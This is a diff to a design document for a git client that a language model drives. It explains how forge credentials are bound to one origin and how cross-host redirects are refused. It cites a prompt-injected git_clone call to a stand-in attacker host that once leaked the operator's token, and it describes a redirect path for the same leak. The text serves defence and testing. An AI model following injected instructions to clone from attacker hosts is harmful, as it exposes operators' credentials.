@@ -115,7 +115,7 @@ Git2 supports multiple authentication methods:
 
 **The pair is bound to one origin** (`credentials.rs`): the `scheme://host[:port]` of
 `remote_addr` when it is a URL, else of the opened repository's `origin` remote. libgit2's
-credential callback names the URL being contacted, and until September 2026 it was ignored
+credential callback names the remote's URL, and until September 2026 it was ignored
 — `git_clone`, `git_fetch` and `git_pull` are open to the model (only pushes are gated by
 `allow_remote_writes`), so a model answering a prompt-injected
 `git_clone {"url": "https://attacker.example/x.git"}` met a 401 there and libgit2 posted the
@@ -123,6 +123,21 @@ operator's forge token to it. The callback now refuses any other origin by name,
 client whose credentials cannot be bound to a host (a local `remote_addr` with no `origin`)
 offers them nowhere, with a warning at connect. `tests/client/git/credential_scope_test.rs`
 runs two fake forges that challenge with Basic and record what they were sent.
+
+**No redirect to another host is followed.** The URL libgit2 passes the credential callback is
+the remote's *original* URL, never the server it reached after a redirect, so with libgit2's
+default (`GIT_REMOTE_REDIRECT_INITIAL`: an off-site redirect is followed on the first request)
+a bound forge answering 302 to another host would have that host's 401 answered with the
+operator's credentials, the scope check passing on the original URL. Every network operation
+therefore takes its options from `credentials::fetch_options` / `credentials::push_options`,
+which set `RemoteRedirect::None` — clone, fetch, pull, push and remote branch delete alike;
+the client opens no other remote connection (no `connect`/ls-remote). libgit2 then fails the
+operation with `cannot redirect from '<host>' to '<other host>'` before connecting to the other
+host. libgit2 compares the host only: a redirect to another port or path on the same host is
+still followed, and a scheme change is allowed only to `https`.
+`credential_scope_test.rs::a_redirect_to_another_host_is_refused_before_it_is_contacted` shows
+the default leaking to a redirect target first, as its control, then the client and the push
+options refusing it.
 
 ## LLM Integration
 
